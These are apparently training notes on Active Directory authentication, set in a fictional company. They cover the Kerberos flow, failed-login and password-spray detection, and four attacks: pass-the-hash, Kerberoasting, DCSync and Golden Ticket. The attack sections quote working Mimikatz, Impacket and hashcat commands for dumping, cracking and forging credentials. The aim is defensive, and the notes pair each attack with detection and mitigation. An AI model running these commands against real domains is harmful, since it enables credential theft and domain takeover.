---

# 📓 DAY 2 — COMPLETE SESSION NOTES
# AD Authentication — The Full Picture
### *SecureCorp Ltd. | Phase 1 — Active Directory Security*

---

## 🏢 SECURECORP REFERENCE CARD
*(Keep this on every day's notes)*

```
PEOPLE:
┌─────────────┬──────────────────────┬───────────────────────────────────┐
│ Name        │ Role                 │ AD Privileges                     │
├─────────────┼──────────────────────┼───────────────────────────────────┤
│ Hareesh     │ IT Admin             │ Domain Admin                      │
│ Priya       │ Developer            │ Standard User + Dev Group         │
│ Jayanth     │ End User Support     │ Account Operator                  │
│ Bharath     │ Network Engineer     │ Network Config + Server Access    │
│ Chaitu      │ HR Manager           │ Standard User + HR Group          │
│ Gani        │ ML Engineer (New)    │ Standard User + ML-Data Group     │
│ Navi        │ SOC Analyst          │ Read-Only Logs + Sentinel Access  │
│ SQLSvc      │ SQL Service Account  │ Local Admin on SQLDB01            │
│ BackupSvc   │ Backup Service Acct  │ Backup Operator                   │
└─────────────┴──────────────────────┴───────────────────────────────────┘

SERVERS:
┌─────────────┬────────────────┬──────────────────────────────────────┐
│ Server      │ IP Address     │ Role                                 │
├─────────────┼────────────────┼──────────────────────────────────────┤
│ DC01        │ 192.168.1.10   │ Domain Controller — Crown Jewel      │
│ SQLDB01     │ 192.168.1.20   │ SQL Database Server                  │
│ FILESVR01   │ 192.168.1.30   │ File Server                          │
│ WEB01       │ 192.168.1.40   │ Internal Web Application             │
│ PRINT01     │ 192.168.1.50   │ Print Server                         │
└─────────────┴────────────────┴──────────────────────────────────────┘

DOMAIN: securecorp.local
```

---

## 📌 SECTION 1 — WHAT LIVES INSIDE DC01

### The Core Concept
DC01 is the **single source of truth** for every identity in SecureCorp. Think of it as the **passport office** of the organization. Every user, every computer, every service — all registered here. No DC01 = no authentication = no access to anything.

### What DC01 Stores for Every User

When Hareesh created each user account, DC01 stored this internally:

```
SECURECORP ACTIVE DIRECTORY DATABASE — DC01 (192.168.1.10)
═══════════════════════════════════════════════════════════════════
ACCOUNT          │ HASH (not password)  │ GROUPS
─────────────────┼──────────────────────┼──────────────────────────
hareesh          │ 8f14e45fceea167...   │ Domain Admins
priya            │ 1679091c5a880faf...  │ Developers
jayanth          │ 45c48cce2e2d7fbd...  │ Account Operators
bharath          │ d3d944681e3d3096...  │ Network-Team
chaitu           │ 6512bd43c6f01a2d...  │ HR-Team
gani             │ c20ad4d76fe97759...  │ ML-Data-Team
navi             │ c51ce410c124a10e...  │ SOC-ReadOnly
─────────────────┼──────────────────────┼──────────────────────────
SQLSvc           │ aab3238922bcc25a...  │ Local Admin on SQLDB01
BackupSvc        │ 9bf31c7ff062936a...  │ Backup Operators
─────────────────┼──────────────────────┼──────────────────────────
★ KRBTGT         │ [MOST SECRET HASH]   │ Signs ALL Kerberos tickets
═══════════════════════════════════════════════════════════════════

★ KRBTGT = The most critical account in all of SecureCorp.
  If its hash is stolen → Golden Ticket attack is possible.
  An attacker with KRBTGT hash owns SecureCorp FOREVER.
```

### Why Passwords Are Stored as Hashes

When Hareesh set Gani's password as `Welcome@1234`, this happened:

```
WHAT HAPPENS DURING PASSWORD SET:
───────────────────────────────────────────────────────────
Plain Text Password:  Welcome@1234
         ↓
    NTLM Hashing Algorithm applied
    (One-way mathematical function — cannot be reversed)
         ↓
Hash stored in DC01:  c20ad4d76fe97759aa27a0c99bff6710

IMPORTANT PROPERTIES OF A HASH:
• One-way only — cannot convert hash back to password
• Same password ALWAYS produces same hash
• One character change = completely different hash
• "Welcome@1234" ≠ "welcome@1234" (case sensitive)
───────────────────────────────────────────────────────────
```

### ⚠️ The Architect's Reality Check on Hashes

```
QUESTION: If hashes can't be reversed, are we safe?

ANSWER: NOT COMPLETELY. Here's why:

❌ PROBLEM 1 — Pass-the-Hash:
   Attacker steals hash → uses hash directly to authenticate
   They never need to know the real password
   The hash IS the key in Windows environments

❌ PROBLEM 2 — Weak Password = Predictable Hash:
   "Password123" → always produces same hash → already in attacker databases
   Attacker looks it up in a Rainbow Table → instant crack, no math needed

❌ PROBLEM 3 — Dictionary Attack:
   Attacker takes the hash offline
   Tries millions of common passwords → hashes them → compares
   If password is weak → found in minutes

✅ WHAT ACTUALLY PROTECTS US:
   Long, complex, unique passwords → hash not in any database
   MFA → even with correct hash, still need second factor
   Protected Users Group → prevents hash caching on endpoints
```

### Key Takeaway — Section 1
> DC01 stores hashes, not passwords. This is safer than storing plain text — but the hash itself becomes a weapon in an attacker's hands. Defense is not just about protecting DC01, it's about making the hashes worthless even if stolen.

---

## 📌 SECTION 2 — THE KERBEROS AUTHENTICATION FLOW

### The Airport Analogy (Understand This First)

```
SECURECORP CAMPUS = AN AIRPORT

🏛️  Main Gate Security = DC01 (Domain Controller)
🪪  Passport Check     = Password Verification
🎫  Boarding Pass      = TGT (Ticket Granting Ticket)
🚪  Each Gate          = Individual Server (SQLDB01, FILESVR01 etc.)
🎟️  Gate Ticket        = Service Ticket
⏰  Boarding Pass      = Valid 10 hours (one working day)
    Expiry

FLOW:
─────
Show passport at main gate → Get boarding pass → 
Show boarding pass at each gate → Get gate ticket → 
Enter that specific area
```

### The Exact Technical Flow — Hareesh Logging In at 8:00 AM

```
⏰ 8:00 AM — Hareesh opens his laptop, types: Hareesh@SecureCorp#1
```

---

**STEP 1 — AS-REQ (Authentication Service Request)**
```
WHO:    Hareesh's Laptop → DC01
WHAT:   "I want to log in as Hareesh"

WHAT IS ACTUALLY SENT:
┌──────────────────────────────────────────────────────┐
│ Username: hareesh                                    │
│ Timestamp: 08:00:01 AM [encrypted with Hareesh's    │
│            password hash — only DC01 can decrypt it] │
│ Request: Please give me a TGT                        │
└──────────────────────────────────────────────────────┘

KEY POINT: The actual password NEVER leaves the laptop.
           Only an encrypted timestamp is sent.
           DC01 proves Hareesh knows his password by 
           successfully decrypting that timestamp.
```

---

**STEP 2 — AS-REP (Authentication Service Response)**
```
WHO:    DC01 → Hareesh's Laptop
WHAT:   "Verified. Here is your TGT."

TGT CONTENTS:
┌──────────────────────────────────────────────────────┐
│ ★ TGT (Ticket Granting Ticket)                       │
│ ─────────────────────────────────────────────────── │
│ Username:        hareesh@securecorp.local            │
│ Groups:          Domain Admins, IT-Team              │
│ Issued by:       DC01                                │
│ Issue Time:      08:00:01 AM                         │
│ Expiry Time:     06:00:01 PM  (10 hours)             │
│ Encrypted with:  KRBTGT hash  ← only DC01 can read  │
└──────────────────────────────────────────────────────┘

KEY POINT: The TGT is encrypted with the KRBTGT hash.
           Only DC01 can read what's inside.
           Hareesh's laptop just carries it — like a 
           sealed envelope it can't open.
```

---

**STEP 3 — TGT Stored in LSASS Memory**
```
Hareesh's Laptop RAM:
╔═════════════════════════════════════════════════════╗
║  LSASS.EXE  (Local Security Authority Subsystem)    ║
║  ┌─────────────────────────────────────────────┐    ║
║  │ Hareesh's TGT                               │    ║
║  │ Hareesh's Password Hash                     │    ║
║  │ Kerberos Session Keys                       │    ║
║  └─────────────────────────────────────────────┘    ║
╚═════════════════════════════════════════════════════╝
         ↑
         🎯 THIS IS THE #1 TARGET FOR ATTACKERS
         
Mimikatz command that dumps this:
> privilege::debug
> sekurlsa::logonpasswords

Result: All hashes and tickets from ALL users 
        who ever logged into this machine
        
THIS IS WHY:
• Admins should NEVER log into regular workstations
• Hareesh should have a SEPARATE admin account
• Admin work should only happen from PAW 
  (Privileged Access Workstation)
```

---

**STEP 4 — TGS-REQ (Ticket Granting Service Request)**
```
⏰ 8:15 AM — Hareesh opens SQL Management Studio
             Connects to SQLDB01 (192.168.1.20)

WHO:    Hareesh's Laptop → DC01
WHAT:   "I need to access SQLDB01. Here's my TGT as proof."

┌──────────────────────────────────────────────────────┐
│ Here is my TGT (sealed envelope)                     │
│ I want a Service Ticket for: SQLDB01                 │
│ My username: hareesh@securecorp.local                │
└──────────────────────────────────────────────────────┘

KEY POINT: Hareesh's laptop presents the TGT it received 
           earlier. DC01 opens it (only DC01 can), 
           verifies it's valid, then issues a new ticket 
           specifically for SQLDB01.
```

---

**STEP 5 — TGS-REP (Ticket Granting Service Response)**
```
WHO:    DC01 → Hareesh's Laptop
WHAT:   "TGT verified. Here is your Service Ticket for SQLDB01."

SERVICE TICKET CONTENTS:
┌──────────────────────────────────────────────────────┐
│ ★ Service Ticket for SQLDB01                         │
│ ─────────────────────────────────────────────────── │
│ Username:        hareesh@securecorp.local            │
│ Privileges:      Domain Admin                        │
│ Target Server:   SQLDB01                             │
│ Valid Until:     06:00:01 PM                         │
│ Encrypted with:  SQLSvc account hash                 │
│                  ← only SQLDB01 can decrypt this     │
└──────────────────────────────────────────────────────┘

KEY POINT: This ticket is encrypted with SQLSvc's hash.
           SQLDB01 has SQLSvc's hash locally.
           So SQLDB01 can decrypt it and trust the contents.
           DC01 never needs to be contacted again for 
           this session.
```

---

**STEP 6 & 7 — AP-REQ and AP-REP (Application Request/Response)**
```
WHO:    Hareesh's Laptop → SQLDB01
WHAT:   "Here is my Service Ticket. Please let me in."

SQLDB01 Process:
1. Receives Service Ticket
2. Decrypts it using SQLSvc's local hash
3. Reads: "This is Hareesh. He is Domain Admin."
4. Checks: Is this ticket expired? No. Is it valid? Yes.
5. ✅ Grants access to Hareesh

Hareesh sees: SQL Management Studio connects successfully
Behind scenes: 0.3 seconds. Completely invisible.
```

---

### Complete Flow Diagram

```
HAREESH'S          DC01                    SQLDB01
LAPTOP             192.168.1.10            192.168.1.20
   │                    │                      │
   │──── AS-REQ ───────▶│                      │
   │  "Prove I'm        │                      │
   │   Hareesh"         │ Verify timestamp ✅  │
   │                    │ Look up hareesh      │
   │                    │ in database          │
   │◀─── AS-REP ────────│                      │
   │  "Here's TGT"      │                      │
   │  [stored in LSASS] │                      │
   │                    │                      │
   │──── TGS-REQ ──────▶│                      │
   │  "Need ticket      │                      │
   │   for SQLDB01"     │ Open TGT ✅          │
   │                    │ Issue Service Ticket │
   │◀─── TGS-REP ───────│                      │
   │  "Here's your      │                      │
   │   Service Ticket"  │                      │
   │                    │                      │
   │─────────────── AP-REQ ──────────────────▶│
   │                "Here's my ticket"        │
   │                                          │ Decrypt ✅
   │                                          │ "It's Hareesh
   │                                          │  Domain Admin"
   │◀────────────── AP-REP ───────────────────│
   │                "Welcome Hareesh ✅"       │
   │                    │                      │
   
TOTAL TIME: < 1 second. Happens every time any resource is accessed.
```

---

## 📌 SECTION 3 — GANI'S FIRST DAY & SECURITY GAPS

### What Hareesh Did to Create Gani's Account

```powershell
# Hareesh runs this on DC01:
New-ADUser `
  -Name "Gani" `
  -SamAccountName "gani" `
  -UserPrincipalName "gani@securecorp.local" `
  -AccountPassword (ConvertTo-SecureString "Welcome@1234" -AsPlainText -Force) `
  -Enabled $true `
  -ChangePasswordAtLogon $true `
  -Department "ML Engineering" `
  -Title "ML Engineer"

Add-ADGroupMember -Identity "ML-Data-Team" -Members "gani"
```

### Security Gaps a New Joinee Creates

```
GANI'S ACCOUNT — SECURITY RISK ASSESSMENT
═══════════════════════════════════════════════════════════
RISK 1: Weak Temporary Password
────────────────────────────────
Password: Welcome@1234
Problem:  This pattern (Welcome@Year) is in every 
          dictionary attack wordlist
          Attacker cracks it in seconds
Fix:      Force complexity, use random temp passwords,
          expire in 24 hours

RISK 2: No MFA Registered
──────────────────────────
Problem:  Account exists with only password protection
          If password is guessed → full access
Fix:      Block login until MFA is registered
          Use Conditional Access policy in Entra ID

RISK 3: Access Too Broad?
──────────────────────────
ML-Data-Team group — what exactly can they access?
Problem:  If group has access to ALL ML data including 
          sensitive training data → violates least privilege
Fix:      Review group permissions before adding new users
          Principle of Least Privilege — minimum access needed

RISK 4: Laptop Not Hardened
─────────────────────────────
New laptop, fresh out of box
Problem:  Missing patches, no EDR configured yet,
          no Defender policies applied
Fix:      Auto-enroll in Intune on first login
          Apply baseline security policy via GPO

RISK 5: No Security Awareness Training
────────────────────────────────────────
Gani is new — doesn't know SecureCorp's security policies
Problem:  Most breaches start with a new employee 
          clicking a phishing email
Fix:      Mandatory security training before first login
          Phishing simulation within first week
═══════════════════════════════════════════════════════════
```

### What Navi (SOC) Sees When Gani Logs In First Time

```
MICROSOFT SENTINEL ALERT — SecureCorp SOC Dashboard
════════════════════════════════════════════════════
🔔 ALERT: New Account First Login — No MFA Registered
────────────────────────────────────────────────────
Account:      gani@securecorp.local
Event:        First successful login detected
Time:         09:00:14 AM
Source IP:    192.168.1.88 (Gani's laptop)
MFA Status:   NOT REGISTERED ⚠️
Risk Level:   MEDIUM
────────────────────────────────────────────────────
Action:       Navi creates ticket → assigns to Hareesh
              "New joinee Gani has no MFA. Please ensure
               MFA registration before end of day."
════════════════════════════════════════════════════
```

---

## 📌 SECTION 4 — WHEN AUTHENTICATION FAILS & WHAT SOC SEES

### Scenario A — Normal Failed Login (Chaitu Forgot Password)

```
EVENT LOG ON DC01:
════════════════════════════════════════════════════════
Event ID:     4625 — An account failed to log on
Time:         11:30:01 AM, 11:30:04 AM, 11:30:07 AM
Account:      chaitu@securecorp.local
Failure Code: 0xC000006A — Wrong Password
Source IP:    192.168.1.105  ← Chaitu's known laptop IP
Workstation:  CHAITU-LAPTOP
════════════════════════════════════════════════════════

SOC ANALYSIS (Navi):
• 3 failures from known internal IP → Normal user error
• No alert triggered (threshold: 5 failures)
• Jayanth (End User Support) resets password
• Hareesh reviews reset in audit logs
• Case closed — no incident
```

### Scenario B — Brute Force Attack (Real Threat)

```
EVENT LOG ON DC01:
════════════════════════════════════════════════════════
Event ID:     4625 — An account failed to log on
Time:         02:00:00 AM → 02:47:23 AM (continuous)
Account:      chaitu@securecorp.local
Failure Code: 0xC000006A — Wrong Password
Attempt Count: 847 attempts in 47 minutes
Source IP:    203.0.113.45  ← EXTERNAL IP 🚨
Workstation:  UNKNOWN
════════════════════════════════════════════════════════

SOC ANALYSIS (Navi — 2:00 AM alert wakes him up):
STEP 1: Verify — Is this real or false positive?
        → 847 attempts from external IP = REAL ATTACK
        
STEP 2: Immediate containment
        → Lock Chaitu's account NOW
        → PowerShell: Disable-ADAccount -Identity chaitu
        
STEP 3: Block attacking IP
        → Call Bharath (Network Engineer) 
        → Block 203.0.113.45 at perimeter firewall
        → Check if same IP attacked other accounts
        
STEP 4: Damage assessment
        → Did ANY login succeed before lockout?
        → Check Event ID 4624 (success) same timeframe
        → Check Chaitu's mailbox for forwarding rules
        → Check if new devices registered to her account
        
STEP 5: Escalation & reporting
        → Raise P1 incident ticket
        → Wake up Hareesh (IT Admin)
        → Document timeline for incident report
        
STEP 6: Morning debrief
        → How did attacker know Chaitu's username?
        → Was it targeted or part of credential stuffing?
        → Review all external-facing login attempts last 30 days
════════════════════════════════════════════════════════
```

### Scenario C — Password Spray Attack (Harder to Detect)

```
CONCEPT:
Brute Force = Try 1000 passwords on 1 account → GETS LOCKED
Password Spray = Try 1 password on 1000 accounts → NEVER LOCKS

WHAT ATTACKER DOES:
Password tried: "Welcome@2024"  (common corporate default)

EVENT LOGS SHOW:
════════════════════════════════════════════════════════
02:00 AM — 4625 — priya failed — 203.0.113.45
02:00 AM — 4625 — jayanth failed — 203.0.113.45
02:00 AM — 4625 — bharath failed — 203.0.113.45
02:00 AM — 4625 — chaitu SUCCEEDED ← 🚨 BREACH
02:00 AM — 4625 — gani failed — 203.0.113.45
02:00 AM — 4624 — chaitu logged in — 203.0.113.45
════════════════════════════════════════════════════════

WHY THIS IS DANGEROUS:
• Each account only had 1 failure — no lockout triggered
• Standard brute force alerts didn't fire
• Chaitu's password WAS "Welcome@2024" (new joinee default!)

HOW NAVI DETECTS THIS:
• Alert: Multiple accounts, 1 failure each, same source IP
• Alert: Successful login from new geographic location
• Alert: Login at 2 AM — outside business hours
• Sentinel KQL query that correlates across accounts
════════════════════════════════════════════════════════
```

---

## ⚔️ THE 4 MAJOR AD ATTACKS — COMPLETE NOTES

### ATTACK 1 — PASS-THE-HASH (PtH)

```
CONCEPT:
Windows uses password hash for authentication internally.
The hash IS the key — not just a representation of it.
Steal the hash → Authenticate as that user → No password needed.

HOW IT HAPPENS IN SECURECORP:
─────────────────────────────────────────────────────────
Step 1: Attacker sends phishing email to Gani
        Gani clicks → malware installed on his laptop
        
Step 2: Hareesh (Domain Admin) logs into Gani's laptop 
        to "fix the issue" → his hash is now cached in 
        LSASS on Gani's compromised laptop
        
Step 3: Attacker runs Mimikatz on Gani's laptop:
        > privilege::debug
        > sekurlsa::logonpasswords
        
        Output:
        Username: hareesh
        Hash: 8f14e45fceea167a5a36dedd4bea2543
        
Step 4: Attacker uses Hareesh's hash to access FILESVR01:
        > pth-winexe -U 'securecorp/hareesh%aad3b...' //192.168.1.30 cmd
        
        Result: Command prompt on FILESVR01 as Hareesh ✅
        No password was ever needed.
─────────────────────────────────────────────────────────

DETECTION:
Event ID 4624 (Login success)
Logon Type: 3 (Network logon)
Auth Package: NTLM  ← 🚨 Should be Kerberos in modern AD
Source IP: Gani's laptop accessing servers Hareesh accesses

Navi's Alert: "NTLM authentication from unexpected workstation 
               for a Domain Admin account"

DEFENSE:
• Add Hareesh to "Protected Users" security group
  → Prevents credential caching on remote machines
  → Forces Kerberos only (no NTLM fallback)
• Privileged Access Workstation (PAW)
  → Hareesh does ALL admin work from one dedicated machine
  → That machine never browses internet or reads email
• Microsoft Defender for Identity
  → Has built-in PtH detection alert
  → Fires within seconds of detection
```

---

### ATTACK 2 — KERBEROASTING

```
CONCEPT:
ANY domain user can request a Kerberos service ticket 
for ANY service account — this is completely normal behavior.
That service ticket is encrypted with the service account's hash.
Take that ticket offline → crack the hash → get the password.
The "request" part looks 100% legitimate in logs.

HOW IT HAPPENS IN SECURECORP:
─────────────────────────────────────────────────────────
Step 1: Attacker compromises Gani's account (lowest privilege)
        Now they have a valid domain user account.
        
Step 2: From Gani's session, attacker runs:
        # On Kali Linux using Impacket:
        python3 GetUserSPNs.py securecorp.local/gani:Welcome@1234 \
                -dc-ip 192.168.1.10 -request
        
        Output — finds ALL service accounts:
        ServicePrincipalName          Name      MemberOf
        ──────────────────────────────────────────────────
        MSSQLSvc/SQLDB01:1433         SQLSvc    Local Admin-SQLDB01
        backup/FILESVR01              BackupSvc Backup Operators
        
Step 3: Gets service tickets (encrypted with SQLSvc hash)
        Ticket saved to file: sqlsvc.hash
        
Step 4: Takes file to his own machine, runs Hashcat:
        hashcat -m 13100 sqlsvc.hash /usr/share/wordlists/rockyou.txt
        
        Result after 4 minutes:
        Hash cracked! Password: SqlServer2019!
        
Step 5: Attacker now has SQLSvc credentials
        SQLSvc is Local Admin on SQLDB01
        Attacker logs directly into SQLDB01 → owns the DB server
─────────────────────────────────────────────────────────

WHY IT'S SO HARD TO DETECT:
• Requesting service tickets is NORMAL behavior
• Every user does this dozens of times per day
• The attack request looks identical to a legitimate one
• The cracking happens OFFLINE — on attacker's own machine
• DC01 sees nothing suspicious

DETECTION (what Navi looks for):
Event ID 4769 — Kerberos Service Ticket Request
Encryption Type: 0x17 (RC4-HMAC) 🚨
→ Modern accounts use AES-256 (0x12)
→ Attackers request RC4 because it's faster to crack
→ A user requesting RC4 tickets is a red flag

Navi's KQL query in Sentinel:
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| summarize count() by Account, IpAddress
| where count_ > 5

DEFENSE:
• Use Group Managed Service Accounts (gMSA)
  → Windows auto-manages the password
  → 240-character random password, rotated automatically
  → IMPOSSIBLE to Kerberoast (password changes constantly)
• For regular service accounts: 25+ character random password
• Audit all SPNs — remove unnecessary ones
• Monitor Event 4769 + RC4 encryption type
```

---

### ATTACK 3 — DCSYNC

```
CONCEPT:
Domain Controllers sync with each other using a protocol 
called Directory Replication Service (DRS).
This replication normally only happens between DCs.
If an attacker has replication rights → they pretend to be 
a DC → ask DC01 to send them ALL password hashes.

HOW IT HAPPENS IN SECURECORP:
─────────────────────────────────────────────────────────
Pre-condition: Attacker now has Domain Admin access
               (via PtH or Kerberoasting chain)

Step 1: Attacker checks if replication rights are misconfigured
        (sometimes misconfigured — non-DCs have replication rights)
        
Step 2: Attacker runs DCSync from their machine:
        # Using Mimikatz:
        lsadump::dcsync /domain:securecorp.local /all /csv
        
        # Using Impacket from Kali:
        python3 secretsdump.py securecorp.local/hareesh@192.168.1.10
        
Step 3: DC01 thinks it's talking to another DC
        Sends back ALL account hashes:
        
        Output:
        hareesh:8f14e45fceea167a5a36dedd4bea2543:::
        priya:1679091c5a880faf6fb5e6087eb1b2dc:::
        chaitu:6512bd43c6f01a2d49fb5e6087eb1b2dc:::
        krbtgt:f4f8edd0e1f0b1a3c24c6eb09e4e3127:::  ← 💀 GAME OVER
        
Step 4: Attacker now has EVERY hash in SecureCorp
        Including the KRBTGT hash
        → Golden Ticket attack is now possible
─────────────────────────────────────────────────────────

DETECTION:
Event ID 4662 — Operation performed on AD object
Properties: 
  Object Type: domainDNS
  Access Mask: 0x100 (Replication rights used)
  Source: NOT a Domain Controller IP  ← 🚨 BIGGEST RED FLAG

Navi's Alert in Sentinel:
"Replication rights used from non-DC machine 192.168.1.88"
This should NEVER happen in normal operations.

DEFENSE:
• Audit who has replication rights on domain object
  → Should be ONLY DC01 machine accounts
  → PowerShell to check:
    (Get-Acl "AD:\DC=securecorp,DC=local").Access | 
    Where {$_.ActiveDirectoryRights -like "*Replication*"}
• Microsoft Defender for Identity
  → Has dedicated DCSync detection
  → Alerts within seconds
• Tier 0 protection — DC01 should be completely isolated
```

---

### ATTACK 4 — GOLDEN TICKET

```
CONCEPT:
KRBTGT is the account that signs (encrypts) ALL Kerberos tickets.
Every TGT in SecureCorp is encrypted with KRBTGT's hash.
If attacker has KRBTGT hash → they can FORGE any TGT.
Forged TGT = any user, any privilege, any expiry they choose.
Even Domain Admin. For 10 years. Completely valid.

HOW IT HAPPENS IN SECURECORP:
─────────────────────────────────────────────────────────
Pre-condition: Attacker got KRBTGT hash via DCSync attack

Step 1: Attacker has:
        KRBTGT hash: f4f8edd0e1f0b1a3c24c6eb09e4e3127
        Domain SID: S-1-5-21-1234567890-1234567890-1234567890
        
Step 2: Attacker creates a Golden Ticket using Mimikatz:
        kerberos::golden 
          /user:HackerAdmin          ← can be ANY username
          /domain:securecorp.local
          /sid:S-1-5-21-...
          /krbtgt:f4f8edd0e1f0b1a3...
          /groups:512                ← 512 = Domain Admins group
          /enddatetime:01/01/2035    ← Valid for 10 years
          /ticket:golden.kirbi
          
Step 3: Attacker injects this forged ticket into their session:
        kerberos::ptt golden.kirbi
        
Step 4: Attacker now has Domain Admin access as "HackerAdmin"
        → "HackerAdmin" doesn't even exist in AD
        → But every server accepts the ticket as valid
        → Because it's encrypted with the real KRBTGT hash
─────────────────────────────────────────────────────────

WHY IT'S SO DEVASTATING:
• Works even after Hareesh's password is changed
• Works even if the compromised account is deleted
• "HackerAdmin" doesn't appear in any user list
• Ticket is cryptographically valid — hard to distinguish
• Survives domain-wide password resets
• Only fix: Rotate KRBTGT password TWICE

DETECTION (very difficult — here's what works):
• Tickets with lifetime > 10 hours → Red flag
• Tickets for accounts that don't exist in AD
• Tickets with anomalous group memberships
• Defender for Identity: PAC validation checking
• Sentinel: Correlate ticket lifetime anomalies

DEFENSE — THE KRBTGT DOUBLE RESET:
─────────────────────────────────────────────────────────
When Golden Ticket is suspected:

Step 1: Reset KRBTGT password (first time)
        → Old tickets still work (they use old hash)
        → Active sessions continue
        
Step 2: Wait 10 hours (maximum ticket lifetime)
        → All old TGTs expire naturally
        
Step 3: Reset KRBTGT password (second time)
        → NOW old hash is completely gone
        → All forged tickets are now invalid
        → Attacker completely kicked out
        
Step 4: Monitor for re-compromise
        → Attacker will try to regain access
        → Watch all authentication logs
─────────────────────────────────────────────────────────

IMPORTANT: Rotating KRBTGT causes temporary disruption.
           Plan this carefully during maintenance window.
```

---

## 🔗 THE COMPLETE ATTACK CHAIN IN SECURECORP

```
DAY 1 — INITIAL ACCESS:
────────────────────────────────────────────────────────
Attacker sends phishing email to Gani (new joinee)
Gani clicks malicious link → malware installed
Attacker has access to Gani's laptop silently
Gani's credentials: gani / Welcome@1234

DAY 1 — KERBEROASTING:
────────────────────────────────────────────────────────
Gani's account is valid domain user
Attacker runs GetUserSPNs.py → finds SQLSvc
Requests service ticket → takes offline
Hashcat cracks "SqlServer2019!" in 4 minutes
Now has SQLSvc credentials

DAY 2 — LATERAL MOVEMENT VIA PtH:
────────────────────────────────────────────────────────
SQLSvc is local admin on SQLDB01
Attacker logs into SQLDB01 using SQLSvc credentials
Hareesh logged into SQLDB01 last week for maintenance
Hareesh's hash is cached in SQLDB01's LSASS
Mimikatz dumps: hareesh's hash extracted
Pass-the-Hash → now moving as Domain Admin

DAY 3 — DCSYNC:
────────────────────────────────────────────────────────
Attacker has Domain Admin (via Hareesh's hash)
Runs secretsdump.py against DC01
Gets ALL hashes including KRBTGT
KRBTGT hash: f4f8edd0e1f0b1a3c24c6eb09e4e3127

DAY 3 — GOLDEN TICKET:
────────────────────────────────────────────────────────
Creates forged ticket valid until 2035
Injects into session → invisible Domain Admin
Sets up persistence via:
  → New admin account hidden in AD
  → Scheduled tasks on multiple servers
  → GPO backdoor configured

DAY 10 — RANSOMWARE:
────────────────────────────────────────────────────────
Creates malicious GPO targeting all computers
GPO runs ransomware executable at 3 AM
All 500 computers encrypted simultaneously
SecureCorp operations completely halted

SOC FAILURE POINT: Should have caught this at DAY 1
When Gani's laptop showed unusual Kerberos requests.
```

---

## 🛡️ COMPLETE DEFENSE REFERENCE

```
DEFENSE LAYER 1 — CREDENTIAL PROTECTION:
┌─────────────────────────────────────────────────────────┐
│ Protected Users Group                                   │
│ → Add: Hareesh, all Domain Admins                       │
│ → Effect: No credential caching, Kerberos only, no NTLM │
│                                                         │
│ Privileged Access Workstation (PAW)                     │
│ → Dedicated machine for admin work only                 │
│ → No email, no internet, no regular user access         │
│ → Hareesh uses PAW for DC01/server management only      │
└─────────────────────────────────────────────────────────┘

DEFENSE LAYER 2 — SERVICE ACCOUNT PROTECTION:
┌─────────────────────────────────────────────────────────┐
│ Replace SQLSvc with gMSA (Group Managed Service Account)│
│ → Windows manages 240-char random password              │
│ → Auto-rotates every 30 days                            │
│ → Cannot be Kerberoasted                                │
│                                                         │
│ PowerShell to create gMSA:                              │
│ New-ADServiceAccount -Name "gMSA-SQL" `                 │
│   -DNSHostName "sqldb01.securecorp.local" `             │
│   -PrincipalsAllowedToRetrieveManagedPassword `         │
│   "SQLDB01$"                                            │
└─────────────────────────────────────────────────────────┘

DEFENSE LAYER 3 — LOCAL ADMIN PROTECTION:
┌─────────────────────────────────────────────────────────┐
│ LAPS (Local Administrator Password Solution)            │
│ → Every machine gets unique local admin password        │
│ → Auto-rotates every 30 days                            │
│ → Stored securely in AD, readable only by authorized    │
│ → Stops lateral movement via shared local admin hash    │
└─────────────────────────────────────────────────────────┘

DEFENSE LAYER 4 — DETECTION:
┌─────────────────────────────────────────────────────────┐
│ Microsoft Defender for Identity (MDI)                   │
│ → Deployed on DC01                                      │
│ → Detects: PtH, Kerberoasting, DCSync, Golden Ticket    │
│ → Alerts in real-time to Navi's Sentinel dashboard      │
│                                                         │
│ Microsoft Sentinel KQL Alerts:                          │
│ → Bulk 4625 from single IP → Brute force               │
│ → 4769 with RC4 encryption → Kerberoasting             │
│ → 4662 from non-DC IP → DCSync                         │
│ → Tickets with 10yr lifetime → Golden Ticket           │
└─────────────────────────────────────────────────────────┘

DEFENSE LAYER 5 — TIERED ADMIN MODEL:
┌─────────────────────────────────────────────────────────┐
│ TIER 0: DC01 only                                       │
│         Account: hareesh-t0@securecorp.local            │
│         Used ONLY for DC management                     │
│         Never touches Tier 1 or Tier 2                  │
│                                                         │
│ TIER 1: Servers (SQLDB01, FILESVR01 etc.)               │
│         Account: hareesh-t1@securecorp.local            │
│         Separate credentials from Tier 0                │
│                                                         │
│ TIER 2: Workstations, end user support                  │
│         Account: hareesh@securecorp.local (regular)     │
│         Cannot touch servers or DCs                     │
└─────────────────────────────────────────────────────────┘
```

---

## 📊 CRITICAL EVENT IDs — COMPLETE REFERENCE

```
┌──────────┬────────────────────────────────┬──────────────────────────┐
│ Event ID │ What It Means                  │ Attack Indicator         │
├──────────┼────────────────────────────────┼──────────────────────────┤
│ 4624     │ Successful login               │ Check logon type + source│
│ 4625     │ Failed login                   │ Bulk = brute force       │
│ 4648     │ Explicit credential login      │ Lateral movement         │
│ 4662     │ AD object operation            │ DCSync if non-DC source  │
│ 4672     │ Admin privileges assigned      │ Privilege escalation     │
│ 4720     │ User account created           │ Rogue account            │
│ 4726     │ User account deleted           │ Covering tracks          │
│ 4769     │ Kerberos service ticket req    │ RC4 type = Kerberoasting │
│ 4771     │ Kerberos pre-auth failed       │ Password spray           │
│ 4776     │ NTLM authentication            │ Should be rare — flag it │
└──────────┴────────────────────────────────┴──────────────────────────┘
```

---

## 🧪 LABS FOR TODAY

```
LAB 1 — View Live Kerberos Tickets (20 min)
Platform: Any Windows machine / Azure VM
─────────────────────────────────────────────
# Open PowerShell as Administrator
klist                    # View all current tickets
klist purge              # Delete all tickets
klist                    # Confirm empty

What to note:
→ Encryption type (AES-256 is good, RC4 is bad)
→ Ticket expiry time
→ Which servers you have tickets for

LAB 2 — Create Gani's Account + Check Logs (20 min)
Platform: Your AD lab (Azure VM with AD)
─────────────────────────────────────────────────────
New-ADUser -Name "Gani" `
  -SamAccountName "gani" `
  -UserPrincipalName "gani@securecorp.local" `
  -AccountPassword (ConvertTo-SecureString "Welcome@1234" -AsPlainText -Force) `
  -Enabled $true `
  -ChangePasswordAtLogon $true

Add-ADGroupMember -Identity "Domain Users" -Members "gani"

# Check Event logs after login
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 5 |
  Select TimeCreated, Message | Format-List

LAB 3 — Detect Failed Logins Like Navi (20 min)
Platform: Windows Event Viewer / PowerShell
